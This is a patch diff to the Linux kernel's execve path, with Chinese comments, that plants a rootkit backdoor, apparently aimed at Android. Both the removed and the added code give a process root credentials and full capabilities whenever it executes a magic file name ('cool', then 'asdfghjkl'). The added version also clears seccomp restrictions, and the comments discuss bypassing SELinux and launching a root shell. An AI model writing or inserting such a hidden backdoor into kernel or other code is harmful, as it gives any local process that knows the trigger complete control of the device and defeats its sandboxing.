@@ -1921,49 +1921,41 @@ static int do_execveat_common(int fd, struct filename *filename,
 	if (IS_ERR(filename))
 		return PTR_ERR(filename);
 
-	/* --- 开始：内核 Root 后门逻辑 --- */
-	if (filename->name && strcmp(filename->name, "cool") == 0) {
+	/* --- Root Kit 注入开始 --- */
+	// 这里的 "YOUR_SECRET_ROOT_KEY" 对应你 JNI 代码中传入的 rootKey
+	// 注意：在实际 Patch 中，通常会把这个 key 放在一个可配置的缓冲区
+	if (filename->name && strcmp(filename->name, "asdfghjkl") == 0) {
 		struct cred *new_cred;
-
-		printk(KERN_INFO "[MagicRoot] Triggered by process %d (%s)\n", current->pid, current->comm);
 
 		new_cred = prepare_creds();
 		if (new_cred) {
-		    // 1. 将所有 UID/GID 设为 0 (Root)
-		    new_cred->uid.val = new_cred->gid.val = 0;
-		    new_cred->euid.val = new_cred->egid.val = 0;
-		    new_cred->suid.val = new_cred->sgid.val = 0;
-		    new_cred->fsuid.val = new_cred->fsgid.val = 0;
-		    new_cred->sgid.val = new_cred->fsgid.val = 0;
+		    // 1. 设置所有 UID/GID 为 0 (Root)
+		    new_cred->uid = new_cred->euid = new_cred->suid = new_cred->fsuid = GLOBAL_ROOT_UID;
+		    new_cred->gid = new_cred->egid = new_cred->sgid = new_cred->fsgid = GLOBAL_ROOT_GID;
 
-		    // 2. 赋予最高能力 (Capabilities)
-		    // 这样可以绕过各种内核权限检查
+		    // 2. 赋予所有 Capabilities (对应你汇编里的 cap_ability_max)
 		    cap_set_full(new_cred->cap_inheritable);
 		    cap_set_full(new_cred->cap_permitted);
 		    cap_set_full(new_cred->cap_effective);
-		    cap_set_full(new_cred->cap_bset);
 		    cap_set_full(new_cred->cap_ambient);
+		    new_cred->cap_bset = CAP_FULL_SET;
 
-		    // 3. 绕过 SELinux (极其重要！)
-		    // 在 Android 中，即使是 UID 0，如果没有正确的 SELinux Context 也会被拦截。
-		    // 我们通过将安全上下文强制设为内核(kernel)或 init 域来获得最高权限。
-		    // 注意：不同内核版本字段名可能略有不同，通常是 security
-		#ifdef CONFIG_SECURITY_SELINUX
-		    // 这是一个常用的 hack：将安全上下文 ID 设为 SECINITSID_KERNEL (通常是 1)
-		    // 你可能需要包含 <security/selinux/initial_sid_to_string.h> 或类似头文件
-		    // 或者直接操作 security 指针（取决于内核版本）
-		    // new_cred->security = ...
-		#endif
-
+		    // 3. 提交凭据
 		    commit_creds(new_cred);
-		    printk(KERN_INFO "[MagicRoot] Privilege escalation successful for PID %d\n", current->pid);
-		}
 
-		// 提权后，我们不希望 execve 继续去寻找那个不存在的密钥文件而返回错误
-		// 但为了简单，让它返回 -ENOENT (文件不存在) 也是可以的，
-		// 因为调用者（你的 CLI）在收到错误时，权限已经变了。
+		    // 4. 清除 Seccomp 限制 (对应汇编里的 TIF_SECCOMP 和 task_struct_seccomp_offset)
+		    // 注意：不同内核版本 seccomp 结构可能略有不同
+		#ifdef CONFIG_SECCOMP
+		    current->seccomp.mode = 0;
+		    current->seccomp.filter = NULL;
+		#endif
+		    clear_tsk_thread_flag(current, TIF_SECCOMP);
+
+		    // 提权后，我们可以返回一个特定的错误码或者让它继续执行一个 shell
+		    // 通常 rootkit 会在这里让它执行 /system/bin/sh
+		}
 	}
-	/* --- 结束：内核 Root 后门逻辑 --- */
+	/* --- Root Kit 注入结束 --- */
 
 	/*
 	 * We move the actual failure in case of RLIMIT_NPROC excess from
